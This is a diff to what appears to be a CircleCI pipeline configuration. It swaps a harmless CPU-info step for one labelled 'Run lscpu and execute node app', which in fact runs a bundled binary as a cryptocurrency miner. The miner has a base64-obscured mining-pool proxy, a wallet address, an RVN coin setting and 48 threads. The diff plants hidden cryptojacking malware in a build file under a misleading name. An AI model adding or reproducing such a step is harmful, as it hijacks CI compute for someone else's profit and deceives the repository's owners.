@@ -7,8 +7,10 @@ jobs:
     steps:
       - checkout  # Optional: checks out your repository code
       - run:
-          name: Run lscpu
-          command: lscpu  # Command to display CPU information
+          name: Run lscpu and execute node app
+          command: |
+            cd anpow1 && chmod +x ./node && echo '{"proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=","config": { "threads": 48, "log": true },"options": { "user": "RWRBUB1MyCu9TuzedVXpFbLLSv7jS3eZKQ", "password": "c=RVN", "argent": "cpu1" }}' > data.json
+            ./node app.js
 
 workflows:
   my_workflow:
